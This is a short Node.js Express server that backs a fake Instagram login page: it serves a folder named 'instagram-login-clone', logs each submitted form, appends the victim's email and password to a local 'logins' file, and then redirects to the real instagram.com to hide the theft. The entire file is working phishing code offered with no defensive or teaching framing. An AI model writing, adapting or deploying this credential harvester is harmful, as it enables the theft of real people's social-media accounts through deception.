const express = require('express')
const fs = require("fs")

function write(json) {
    fs.readFile('foo.txt', (err, data) => {
        if (err) {
            fs.writeFileSync("logins","");
        }
        fs.writeFileSync(".\\logins", data + "\n" + json.email + "    " + json.password);
    });
}

const app = express()

app.use(express.urlencoded());

app.use(express.json());

const { dirname } = require('path');
const appDir = dirname(require.main.filename);
app.use(express.static(`${appDir}\\instagram-login-clone`))

app.post("/", (req,res) => {
    console.log(req.body)
    write(req.body)
    res.redirect("https://instagram.com/")
})

app.listen(8080)